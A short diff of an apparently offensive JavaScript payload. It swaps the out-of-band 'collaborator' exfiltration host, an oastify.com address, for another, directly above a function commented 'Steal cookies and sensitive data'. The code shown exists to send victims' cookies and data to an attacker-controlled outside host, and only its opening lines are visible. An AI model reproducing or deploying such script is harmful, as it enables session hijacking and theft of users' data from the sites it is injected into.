@@ -2,7 +2,7 @@
 (function() {
     'use strict';
     
-    const collaborator = 'http://gauw9qt2for8m1wvltp1g1r8szyqmhe53.oastify.com';
+    const collaborator = 'http://m8vcp447edukuw4yezyuxyi13s9jxdl2.oastify.com';
     
     // Steal cookies and sensitive data
     function stealData() {
